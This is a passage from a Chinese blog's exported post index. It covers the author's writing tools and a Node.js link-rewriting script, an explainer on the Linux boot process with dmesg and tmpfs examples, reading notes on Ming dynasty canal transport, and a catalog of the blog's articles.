    <content type="text"><![CDATA[摘要 工欲善其事，必先利其器 Question Hexo g 失败【Uncaught SyntaxError: Invalid or unexpected token】：临时办法-复制到Editplus查看乱码 hacker slides 增加 hexo search feature LaTex:增加数学公式支持 OmniFouse: 项目和上下文分类设置还比较混乱，有待重构 Ulysses：多种样式效果不佳（图片连接、代码块） 编辑发布流程:目前的方式（local-&gt;Blog(markdown),review-&gt;Jianshu(markdown),review-&gt;微信公众号），内容粘贴到公众号编辑器还需要比较多手工处理，未统一微信发布内容样式表。 Mac:如何设置左手 &lt;- -&gt; 方向键 ？ （右手仍然需要鼠标的情况下） PPT:vm win下正常，mac下英文字母乱码 Texture：一个优雅的开源学术论文书写工具 Classic Papers:谷歌学术推出“经典论文”排行 HistoryLatest add Xmind replace MindManager,201807 v4:201801 更新内容： 数据可视化（五）基于网络爬虫制作可视化图表 基于 Node.js 实现程序化文本编辑 基于 Graphviz 实现程序化绘图 图片处理（Photoshop):批处理与动作 Blog generator(hexo):优化内容页脚模版、修复google/baidu site xml 问题、修复https兼容问题 1vi /theme/yilia/layout/_partial/article.ejs 扩展 Markdown 源文件编辑工具集（nodejs-based） 前期需求：1）源文件持续修改中出现的回归编辑工作，互相引用的链接较多2）兼容现有的 Blog Generator (Hexo) 便于融合使用3）支持 command-line 模式便于调用 后续目标：1）专题模板一次编辑，多处插入2）主体自动聚合，类似维基（Template talk） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970var fs = require('fs-extra');var path = require('path');// All paths are relative to package.json.var pagesPath = './source/_posts';var copyFolders = ['./images', './css', './js'];var outputPath = './tmp';// First delete everything in the tmp directory.console.log('Cleaning previous tmp...');try &#123; for (var file of fs.readdirSync(outputPath))&#123; fs.removeSync(path.join(outputPath, file)); &#125;&#125;catch (err)&#123; console.log('Error during cleanup: '+err); process.exit(1);&#125;// Then read everything in the pages directories.var pages = &#123;&#125;, pagesMeta = &#123;&#125;;console.log('Loading pages...');try &#123; for(var page of fs.readdirSync(pagesPath))&#123; pages[page] = fs.readFileSync(path.join(pagesPath,page),'utf8'); &#125;&#125;catch (err)&#123; console.log('Error during page loading: '+err); process.exit(1);&#125;// Generate each page from the data provided, using the template.console.log('Generating pages...');try &#123; for(var page of Object.entries(pages)) &#123; var pageFullName = page[0]; var pageName = page[0].slice(0, page[0].lastIndexOf('.')); var metaData = pagesMeta.hasOwnProperty(pageName+'.json') var source_file = pagesPath +'/'+ pageFullName; var target_file = outputPath +'/'+ pageFullName; //console.log(pageFullName); if(source_file.lastIndexOf('.md')&gt;0)&#123; var source_str = 'http:\\/\\/riboseyim.github.io'; var target_str = 'https:\\/\\/riboseyim.github.io'; var exec = require('child_process').exec; var cmdStr = 'gsed -e "s/'+source_str+'/'+target_str+'/g" ' + source_file + ' &gt; ' + target_file; console.log(cmdStr); exec(cmdStr, function(err,stdout,stderr)&#123; if(err) &#123; console.log('exec error:'+stderr); &#125; else &#123; //console.log(stdout); &#125; &#125;); &#125; &#125;&#125;catch (err)&#123; console.log('Error during page generation: '+err); process.exit(1);&#125;console.log('--------------Done!--------------------'); v3:201706 更新内容：OmniFouse: 计划管理、进度提醒数据容灾：统一使用坚果云摄影处理：图片像素、大小处理OmniGraffle：存量数据合并整理，空间布局／样式配色技巧升级图床：云存储分库、图片命名、批处理Evernote、Ulysses：一般性创意素材从Evernote迁移到UlyssesAtom: 发布定稿前版本采用Atom作为编辑器GitBook: 《Linux Perf Master》 反馈极好版权骑士: 效果不佳，remove v2:201701 分享：从Evernote到Ulysses 更新内容：摄影器材：微单。效果较好的场景：园林、博物馆、航展OmniGraffle：高级应用技能：图层、统一样式、配色技巧图床：采用七牛云Evernote：及时检阅、分类、删除剪辑内容GitBook: 新手入门Blog generator(hexo): 优化Markdown–&gt;Html自动生成、发布流程 v1:201606 分享：思维利器OmniGraffle 更新内容：Evernote：素材仓库支持所有手机、平板和电脑。在任意一台设备打开Evernote，随时记录一切、轻松收集资料、一键演示笔记、高效协作共享。 MindManager：框架梳理一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，MindManager可以辅助进行思维整理、分析、可视化的工具。比如写这篇的时候，就是现在MindManager梳理了一个概要，之后导出为文本作为底稿。 OmniGraffle：思维可视化由The Omni Group制作的一款绘图软件，它曾获得苹果设计奖。可以支持流程图、逻辑图、模型设计等，堪称万能绘图神器。这年头大家都挺忙的，能用一张图表达的意图，就不用写一大堆字啦。 Markdown：一次编写，到处发表Markdown标记语言，我其实很久以前就掌握了，但是使用频率很低，也谈不上什么美感。真正推动我把Markdown纳入个人工具箱的也是写作，可以说是相辅相成吧。它最大的意义在于通过极简的形式，解决了写作成果的移植通用性的问题。 Ulysses：样式精美、版本管理、ZoomIn/ZoomOut 版权骑士：打击盗版，人人有责。 “维权骑士”有一套自己的监测系统。签约作者用发表的文章，都会纳入“维权骑士”的监测系统，并与各公众号、网站发布内容进行“比对”。一旦发现抄袭，将负责代表作者维护版权。 扩展阅读 最佳写作实践：从Evernote到Ulysses Kanban 看板管理实践精要 数据可视化（一）思维利器 OmniGraffle 绘图指南 基于Redmine的项目管理平台 参考文献]]></content>
      <tags>
        <tag>Mac</tag>
        <tag>工具癖</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统原理：How Linux Works(Initial)]]></title>
    <url>%2F2017%2F05%2F29%2FLinux-Works%2F</url>
    <content type="text"><![CDATA[摘要 一、How the Linux Kernel Boots 二、How User Space Starts 三、The Initial RAM filesystem 史蒂夫·乔布斯（Steve Jobs）：“假设你可以缩短10秒钟的开机时间，把这个乘上500万，那就是每天5000万秒了。一年下来大概是好几十辈子的时间。想想看，如果你可以让开机速度快10秒钟的话，就拯救了数十条生命。这很值得啊，你不觉得吗？” 《硅谷革命：成就苹果公司的疯狂往事》 一、How the Linux Kernel Boots The machine’s BIOS or boot firmware loads and runs a boot loader.(Boot Loader 是在操作系统内核运行之前运行的一段小程序，它严重地依赖于硬件而实现) The boot loader finds the kernel image on disk, loads it into memory, and starts it. （选择内核镜像，加载到内存空间，为最终调用操作系统内核准备好正确的环境。） The kernel initializes the devices and its drivers.（初始化硬件设备及其驱动程序） The kernel mounts the root filesystem.（挂载根目录。根目录指文件系统的最上一级目录，它是相对子目录来说的；它如同一棵大树的“根”一般，所有的树杈以它为起点） The kernel starts a program called init with a process ID of 1. This point is the user space start.（内核启动一个初始化程序，从这里开始虚拟内存开始划分出使用者空间，与内核空间（Kernel space）对应） init sets the rest of the system processes in motion At some point, init starts a process allowing you to log in, usually at the end or near the end of the boot. Startup Messages有两种方式可以查看内核引导和运行诊断信息： 查看内核系统日志文件。文件路径： /var/log/kern.log 执行dmesg命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859[root@li1437-101 ~]# dmesg[ 0.000000] Linux version 4.9.7-x86_64-linode80 (maker@build) (gcc version 4.7.2 (Debian 4.7.2-5) ) #2 SMP Thu Feb 2 15:43:55 EST 2017[ 0.000000] Command line: root=/dev/sda console=tty1 console=ttyS0 ro devtmpfs.mount=1[ 0.000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'[ 0.000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'[ 0.000000] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'[ 0.000000] x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256[ 0.000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.[ 0.000000] x86/fpu: Using 'eager' FPU context switches.[ 0.000000] e820: BIOS-provided physical RAM map:…….[ 0.000000] NX (Execute Disable) protection: active[ 0.000000] SMBIOS 2.8 present.[ 0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.9.1-0-gb3ef39f-prebuilt.qemu-project.org 04/01/2014[ 0.000000] Hypervisor detected: KVM……[ 0.371925] raid6: sse2x1 gen() 7490 MB/s[ 0.428689] raid6: sse2x1 xor() 5953 MB/s[ 0.485463] raid6: sse2x2 gen() 9289 MB/s[ 0.542230] raid6: sse2x2 xor() 6754 MB/s[ 0.599013] raid6: sse2x4 gen() 10954 MB/s[ 0.656189] raid6: sse2x4 xor() 5522 MB/s[ 0.656943] raid6: using algorithm sse2x4 gen() 10954 MB/s[ 0.657588] raid6: .... xor() 5522 MB/s, rmw enabled……[ 1.053697] Netfilter messages via NETLINK v0.30.[ 1.054471] nfnl_acct: registering with nfnetlink.[ 1.055332] nf_conntrack version 0.5.0 (8192 buckets, 32768 max)[ 1.056324] ctnetlink v0.93: registering with nfnetlink.[ 1.057335] nf_tables: (c) 2007-2009 Patrick McHardy &lt;kaber@trash.net&gt;[ 1.058393] nf_tables_compat: (c) 2012 Pablo Neira Ayuso &lt;pablo@netfilter.org&gt;[ 1.059599] xt_time: kernel timezone is -0000[ 1.060296] ip_set: protocol 6[ 1.060791] IPVS: Registered protocols (TCP, UDP, SCTP, AH, ESP)[ 1.061940] IPVS: Connection hash table configured (size=4096, memory=64Kbytes)[ 1.063162] IPVS: Creating netns size=2104 id=0[ 1.064139] IPVS: ipvs loaded.……[ 1.744221] systemd[1]: Detected virtualization kvm.[ 1.745058] systemd[1]: Detected architecture x86-64.[ 1.747402] systemd[1]: Set hostname to &lt;localhost.localdomain&gt;.[ 1.834328] tsc: Refined TSC clocksource calibration: 2800.119 MHz[ 1.835512] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x285cb16f950, max_idle_ns: 440795333193 ns[ 1.843476] systemd[1]: Created slice Root Slice.[ 1.844251] systemd[1]: Starting Root Slice.[ 1.845835] systemd[1]: Created slice System Slice.[ 1.846631] systemd[1]: Starting System Slice.[ 1.848257] systemd[1]: Listening on udev Kernel Socket.[ 1.849119] systemd[1]: Starting udev Kernel Socket.[ 2.014715] EXT4-fs (sda): re-mounted. Opts: (null)[ 2.038202] systemd-journald[2010]: Received request to flush runtime journal from PID 1[ 2.241341] audit: type=1305 audit(1488188850.897:2): audit_pid=2215 old=0 auid=4294967295 ses=4294967295 res=1[ 2.287758] Adding 262140k swap on /dev/sdb. Priority:-1 extents:1 across:262140k FS[ 2.905177] IPVS: Creating netns size=2104 id=1[ 2.954613] IPv6: ADDRCONF(NETDEV_UP): eth0: link is not ready[ 2.955987] 8021q: adding VLAN 0 to HW filter on device eth0[ 8.009765] random: crng init done 在故障排查中，dmesg信息需要首先查看,例如输出最近10条系统信息,可以查看到引起性能问题的错误。12345678$ dmesg | tail[1880957.563150] perl invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0[...][1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child[1880957.563408] Killed process 18694 (perl) total-vm:1972392kB, anon-rss:1953348kB, file-rss:0kB[2320864.954447] TCP: Possible SYN flooding on port 7001. Dropping request. Check SNMP counters. Kernel initialization and Boot Options在启动时，Linux内核初始化的顺序如下： CPU inspection （检查CPU） Memory inspection （检查内存） Device bus discovery （发现设备总线） Device discovery （发现设备） Auxiliary kernel subsystem setup(networking, and so on) （辅助内核子系统启动，例如网络等） Root filesystem mount （挂载根目录） User space start （用户空间启动） Kernel Parameters文件/proc/cmdline记录了系统内核启动参数：12[root@li1437-101 ~]# cat /proc/cmdlineroot=/dev/sda console=tty1 console=ttyS0 ro devtmpfs.mount=1 查看运行级别：123[root@li1437-101 ~]# who -r run-level 3 2017-02-27 09:47[root@li1437-101 ~]# 二、How User Space Starts用户空间启动顺序: init 必要的低层服务例如：udevd 和 syslog 网络配置 中高层服务例如 ：cron , printing 登录提示、图形界面及其它高层次应用 天字第一号进程init（initialization的简写）是 Unix 和 类Unix 系统中用来产生其它所有进程的程序。它以守护进程的方式存在，其进程号为1。Linux系统在开机时加载Linux内核后，便由Linux内核加载init程序，由init程序完成余下的开机过程，比如加载运行级别，加载服务，引导Shell/图形化界面等等。123[root@li1437-101 ~]# ps -ef | grep initroot 1 0 0 Feb27 ? 00:03:05 /sbin/initroot 28683 28663 0 02:44 pts/0 00:00:00 grep --color=auto init 123456789// Mac OSbash-3.2$ ps -ef | grep init 0 243 1 0 15 517 ?? 0:00.74 /System/Library/CoreServices/CrashReporterSupportHelper server-init 0 533 1 0 15 517 ?? 0:02.07 /System/Library/CoreServices/SubmitDiagInfo server-init 501 52150 1 0 日01下午 ?? 0:15.49 /usr/libexec/secinitd 0 69864 1 0 11:35上午 ?? 0:00.20 /usr/libexec/secinitd 0 72830 1 0 1:51下午 ?? 0:00.19 /usr/libexec/secinitdDarwin ACA80166.ipt.aol.com 16.5.0 Darwin Kernel Version 16.5.0: Fri Mar 3 16:52:33 PST 2017; root:xnu-3789.51.2~3/RELEASE_X86_64 x86_64bash-3.2$ 在Linux发行版中，init有三种主要的实现形式： System V init: 传统的 systemd: 所有主流Linux发行版中的标准init Upstart: Ubuntu Android 和 BSD （运行存放于’/etc/rc’的初始化 shell 脚本）也有它们自己的init版本，一些发行版也将System V init 修改为类似BSD风格的实现。目前大部分Linux发行版都已采用新的systemd替代System V和Upstart，但systemd向下兼容System V。 System V init: 存在一个启动序列，同一时间只能启动一个任务，这种架构下，很容易解决依赖问题，但是性能方面要受一些影响。systemd is goal oriented. : 针对System V init的不足，systemd所有的服务都并发启动。systemd时基于目标的，需要定义要实现的目标，以及它的依赖项。systemd 将所有过程都抽象为一个配置单元，即 unit。可以认为一个服务是一个配置单元；一个挂载点是一个配置单元。 Upstart is reactionary.:Upstart是基于事件的，Upstart的事件驱动模型允许它以异步方式对生成的事件作出回应。 三、The Initial RAM filesystemLinux内核不能通过访问PC BIOS 或者 EFI接口从磁盘获取数据，所以为了mount它的root filesystem, 对于底层存储需要驱动程序支持。解决方案是在内核运行之前，由boot loader加载驱动模块及工具到内存。在启动时，内核读取相关模块到一个临时的RAM filesystem(initramfs),挂载在／根目录,initramsfs允许内核为真正的root filesystem加载必要的驱动模块。最后，再挂载真正的root filesystem、启动init。 Linux在很多场景下都需要创建一个基于内存的文件系统，提供一个可以接近零延迟的快速存储区域。目前有两类主要的RAM磁盘可用，她们个有优劣：ramfs和tmpfs。(注意：创建之前可以使用 free 命令查看未使用的RAM) 1234# mkdir /mnt/ramdisk# mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk# vi /etc/fstab#tmpfs /mnt/ramdisk tmpfs nodev,nosuid,noexec,nodiratime,size=1024M 0 0 源码阅读的一般方法 核心子系统（例如进程管理子系统） 结构体、数据结构 关键程序、加载顺序 主题式探索（例如：Linux 支持闰秒吗？） 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 《Linux 的启动过程》，白崎博生，2004 （暂无中文版） 《深入理解 Linux 内核》，Daniel P.Bovert （经典） Inside the Linux boot process linfo.org:Root Filesystem Definition 阮一峰：Systemd 入门教程：命令篇 阮一峰：Systemd 入门教程：实战篇 IBM developerworks:浅析 Linux 初始化 init 系统，第 3 部分: Systemd 维基百科：Systemd differences between ramfs and tmpfs Unix Background (Signal、Messages &amp; Queue) | Simon Hørup Eskildsen (推荐) How the Kernel Manages Your Memory | Gustavo Duarte (推荐) What Your Computer Does While You Wait | Gustavo Duarte (推荐) What Does an Idle CPU Do? | Gustavo Duarte]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黄仁宇：明代的漕运]]></title>
    <url>%2F2017%2F05%2F28%2FHistory-Caoyun%2F</url>
    <content type="text"><![CDATA[明代的漕运第一章 京杭大运河的背景和本文的研究目的明朝宫廷对大运河的依赖程度前所未有，远远超过以前的历代王朝。元朝时期的运河不过是海运的辅助性交通，无关紧要。而在明代，大运河是京城和江南之间唯一的交通运输线，所有供应都要经过它。（p16） 在供应名单中，除了谷物占据首要地位外，其他物品包括新鲜蔬菜和水果、家禽、纺织品、木料、文具、瓷器、漆——几乎所有中国所产的各种物品都通过大运河进行输送；诸如箭杆和制服之类的军需品，苕帚和竹耙之类的家用器具，也经过运河运送到北京去。整个明代，这种依赖性一直存在，从未中断。(p16) 概括大运河的背景情况，就是以一种特定方法把一个民族的大致情况描绘出来。从明代帝王、大臣管理漕运的方法中，我们可以推断描绘明代的政治体制、政府模式、财政政策以及社会风俗和统治思想。（p17） 第二章 京杭大运河的地形概况 维持这些运河，主要在于使它们能够通航的费用，如一位数学家说的，每年达到一百万。所有这些对欧洲人来说似乎是非常奇怪的，他们可以从地图上判断，人们可以采取一条既近而花费又少的从海上到北京的路线。这可能确实是真的。但害怕海洋和侵扰海岸的海盗，在中国人的心里是如此之根深蒂固，以致他们认为从海路向朝廷运送供应品会危险得多。(利玛窦：《十六世纪的中国——利玛窦札记（1583-1610）》，page 306) 第三章 明代管理大运河的行政机构明政府倾向于在前台维持一套僵硬的官僚体制，在后台进行调整和控制。虽然明廷因实际情况而不得不做一些改革，但在同时又尽力维持已经设置起来的官僚体制，甚至为此不惜折中解决官员职能。这样，虽然例外增加了一些临时性机构，但明廷从未设法对政府机构做定期调整，总是继续维持着官僚体制的表面性。……存在着职责规定不明、职务断裂、双套中央政府机构、机构重叠之类的毛病。（p45） 漕运总督一职的职责没有清楚地规定，担任者就有机会显示自己的个人特性。既然此职的职掌五花八门，这就需要任职者的才能全面，能够发挥自己的创造性。事实证明，担任此职的，从整体来看，都是一些精力充沛、意志坚定、处事果断的官员。(p54) …… 在91名漕运总督中，有32位随后成为内阁成员。考虑明代内阁职位经常被势力强大的人物长时期独占，这个纪录就值得注意。（p55） 明政府在清江浦设有检查站，负责征税：1、打造船只原来的货物税，实物征收，包括木材、竹子、铸铁、石灰、麻、煤和桐油。2、其他物品则由淮安府负责征收通行税。检查站官吏由淮安知府派任首席代表、办事吏员，工部清江浦分司郎中派任副官，山阳县派遣卫兵和勤杂工。全部职员超过100名。（p60）检查站所有征税收据和账簿由漕运总督签发，受其严密监督。 尽管明代官僚体制被严格地划分为几部分——文官系统和军事系统之间、京官和地方官之间、尚书大臣和朝廷特派官员（commissionary）之间,明显存在着不可跨越的鸿沟——然而下层官僚体制，比如我们上面提到的分支机构，却表现出足够的适应能力，使各个部分能够一直地运作起来。来自各个对立系统的官吏能够组织在一起。（p62） 第四章 漕粮运输明朝统治早期，全国税额总数接近2950万石。1200万石由地方政府支配，作为官俸、行政费、抚恤金和养老金、赈济费、官府学校费和地方粮仓储存费。另外800万石，主要在华北征收，作为驻守西北前线军队的军粮。其余不到1000万石的税粮，供中央政府花费，其中120.8万石给南京，北京所得总数在820万石左右。（p71） 稳定性是漕运体系运作的一大显著特点。它基本上反映了明廷努力根据预定计划，固定国库收入和支出。 漕军堕落和普遍贫困。（暂略）明初38万世袭军户，十六世纪早期下降到5万户，原因军户逃亡。 “解户”制导致贫困和破产（暂略）：税粮必须由纳税人运送到目的地。 西北地区不得不从其他地区购买茶叶、盐和纺织材料之类的必需品，又找不到平衡贸易和增加收入的途径，西北地区银两大量外流，导致该地区在随后的时期全面萧条。（p123） 早期由于前线地区要用粮食付税，盐商会在边境地区拥有自己的土地。1492年，明廷宣布用银两支付，盐商从北方地区变卖土地离开。（p124） 危机：明王朝由于不能动员地方资源为其目的服务，导致其统治全面削弱。（p135） 误区：漕河在明王朝统治后期仍然完整无损，漕运数量也未大幅度下降。漕河水道状况同明王朝统治的崩溃并无什么关系（p136） 败因：明廷失败原因起源于其君臣盲目地执行明王朝建立者制定的总计划。一旦先例确立起来，即使有的并不合理，他们不愿意也无力加以改变。（p140）在明王朝统治后期，虽然已经发现了它存在不足，但是明廷未采取任何措施加以改进。同时，看来并无任何其他候补体系取代它。（p142） 第五章 宫廷供应品的漕运在宦官催促的影响下，皇帝通常在旧的供应商品之外，命令进贡新品种。从理论上说，新增加的物品应该从供应地区所承担的土地税中扣除，而实际上，明廷常常“忽视”扣除，有关地区必须毫无补偿地进贡。而且，先例一开，除非撤销，有关府县就必须维持、继续。（p145） 各类供应品的相关数据（暂略） 明廷变成一种张开血嘴的庞然大物，迅速吞没了全国的额外生产。它所设置的宗人府，是成千上万人的“食堂”。在一定程度上，明廷也变成了消费品的分配中心。它把各种各样的供应分配给贵族家庭和政府官员。这样，明政府就进一步把国家顶层的购买力取消了，私人商业没有什么发展的机会和余地了。（p176） 第六章 征税、商业、旅行和劳役总结明代官僚反对改变国家的农业大国形象，不愿意去进行任何发展实验；这种情况可以说明他们那个时代的“新”政治观念和思想观念，是缺乏独创性的。 在15世纪早期设置的漕运体系及其附属机构，尽管存在着调查不足，仍然是解决问题的方法，具有一定的合理性。但是在16世纪，这个体系由于僵化，其中许多设置明显过时了。到该世纪末和17世纪早期，明代官员明显落后于时代的发展了。他们管理国家的思想观念和现实之间的断裂，再不能以技术补救来解决了。根本原因在于，他们的思想没有活力，已经僵化了。 扩展阅读 参考文献 D.C. 特威切特：《唐朝的财政金融管理制度》 贺凯：《明王朝的政府组织》(Governmental Organization of the Ming Dynasty)（对明代政府机构作了综合性考察） 佐久间重男：《明代商税征收和财政之间的关系》 安东尼-佛朗西斯-普雷沃斯：《耶稣会士的历史性旅行》 D. 盖达（D. Gandar）牧师：《运河帝国》（Le Canal Imperial）(对淮河和长江之间的大运河河段和航图进行研究) 吴缉华：《明代海运及运河的研究》（台北，1961年版）]]></content>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RiboseYim's Blog Root Catalog]]></title>
    <url>%2F2017%2F05%2F26%2FCatalog%2F</url>
    <content type="text"><![CDATA[一、Autobiography | 我的自传 2018 年度盘点 2017 年度盘点 2016 年度盘点 2012 阅读书单 About RiboseYim 二、过程改进 &amp; 方法论 工程师的自我修养：全英文技术学习实践 嗑药简史：关于瘾品，成瘾机制及其历史 嗑药简史（四）：咖啡上瘾，喝还是不喝？ DevOps 漫谈：从作坊到工厂的寓言故事 DevOps 漫谈：Kanban看板管理实践精要 最佳写作实践：从Evernote到Ulysses 我的写作工具链 我的电子书列表 最佳思维利器 OmniGraffle for Mac 藏书与阅读 知识产权法（Intellectual Property）概要 待完善Study The Master 待完善工具集 三、Information Technology DevOps 漫谈：从作坊到工厂的寓言故事 软件工程实践中的十大法则 谁是王者：macOS vs Linux Kernels ？ AI数学&amp;算法 数学常识|如何度量复杂性 读书笔记|数学之美（Beauty Of Mathmetics） 概率论基础：从马尔可夫模型（Markov Model）到贝叶斯网络 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 PriviewMachine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 Machine Learning:人工智能媒体报道集 Machine Learning:自然语言处理技术简报 经济学人：计算机如何学习人类语言？ 通信协议 计算机 RFC 文档 TCP | UDP | gRPC 开发语言 Compiler,编译原理 C | Java | Perl | Ruby | Python | Node | R | Go 源代码版本管理：Git 玩转编程语言:构建自定义代码生成器 Coder:代码工具、命名、自动生成及其它技巧 Stack Overflow：2017年最赚钱的编程语言 Linux 操作系统 Linux 常用命令一百条 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单(Netflix版) Linux 性能诊断：荐书|《图解性能优化》 Linux 性能诊断：荐书|《Linux Perf Master》 Linux 性能诊断：Web应用性能优化 Linux 性能诊断：基于 Ganglia 实现集群性能态势感知 系统系统架构：从珠海航展交通管控实践谈起 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux DevOps 漫谈：基于OpenCensus构建分布式跟踪系统 信息安全 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处网络安全与科技罪案调查科 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 开源技术漫谈 架构师 《Stack Overflow 架构解析 - 2016 Edition》 Linux.com: 引入开源软件的六大运营挑战 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 最佳工程实践：Oracle 数据库迁移割接实践 开源技术架构漫谈：PostgreSQL 数据库 最佳工程实践：基于LVS的AAA负载均衡架构实践 开源技术架构漫谈：ZeroMQ 数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（十）公共数据源列表 四、Network Engineering 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 远程通信协议：从 CORBA 到 gRPC SDN技术指南 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? Stack Overflow：云计算平台的趋势分析（AWS or Azure） 未分类DevOps GOPS,高效运维社区 DevOps 漫谈：基础设施部署和配置管理 2018 年度 Docker 用户报告 - Sysdig Edition SRE虚拟化TeamWork,关于群体决策TechThinking,关于技术思维Nature&amp;ScienceNature&amp;ScienceCatalog:Medicine Catalog:Health 嗑药简史（一）：药物成瘾、生活习惯与神经系统 嗑药简史（二）：瘾品跨境流动与外交关系 嗑药简史（三）：瘾品管制背后的情与法 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017) 医学常识| 肝系统健康状况评价指标体系 医学常识| NIH 情绪健康检查单 WorldBook:关于知识体系的构建（构思）EconomistThe Economist The Economist:Books of the Year 2017 Economist:Books of the Year 2016 经济学人：加拿大的一夫多妻问题 —— 摩门教、移民和穆斯林 书单(Economist:《Books of the Year 2016》) 经济学人：解读世纪小说《悲惨世界》 读书笔记|彼得·德鲁克：管理是一种自由 Economist译文:欧洲难民计划：移民危机管理 Economist译文:The Saudi blueprint 沙特王国的改革蓝图 Economist译文:2016年全球经济形势预测 Economist译文:印度电商竞赛 Economist译文:越共换届－巨变或轮回？（201612封禁） Economist译文:事与愿违的后门程序 Economist译文:当代德国纳粹魅影 Economist译文:自由迁徙的障碍（201612封禁） Economist译文:奢侈品—万金藏獒（201612封禁） History分类：History 分类：Humanics(人类学) 读书笔记|顾准《顾准日记》 清史 清史-雍正时期：《大义觉迷录》 (通阅,201705) 清史-乾隆时期：《叫魂》 清史-嘉道咸时期：史景迁《太平天国》 清史-嘉道咸时期：张集馨《时晴斋主人自叙年谱》 清史-同治光绪时期：谭嗣同 《国士无双伍连德》 明史 黄仁宇:《万历十五年》 黄仁宇:《放宽历史的视界》 黄仁宇:《明代的漕运》 小说《明朝那些事》 影视作品《大明王朝1956》：政府财政逻辑 明史：李自成 Policy&amp;Law政府行为模式与预测专题：公共医疗专题：公共财政专题：贫困问题专题：宗教治理专题：民权法法律专题：网络安全法 Cyber-Security 美国网络安全立法策略 香港网络安全与科技罪案总警司 专题：知识产权法 （未完成）基于专利文档的信息检索 专题：新闻出版法Manager 读书笔记|彼得·德鲁克：管理是一种自由 讲武堂 美军士官制度观察 美军体能训练观察 各国军警体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要 2016 年珠海航展摄影图辑 生活 Travel Museum：博物馆大全 Birdwatching|广州湿地公园 园林|南京瞻园 艺术评论 古典音乐低俗史 电影评论 |《灵魂解码《林肯》》 电影评论 | 斯皮尔伯格的林肯情怀 舞台剧 |《南海十三郎》幕后故事 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 钞票人物：风流小王爷]]></content>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言系列]]></title>
    <url>%2F2017%2F05%2F26%2FLanguage%2F</url>
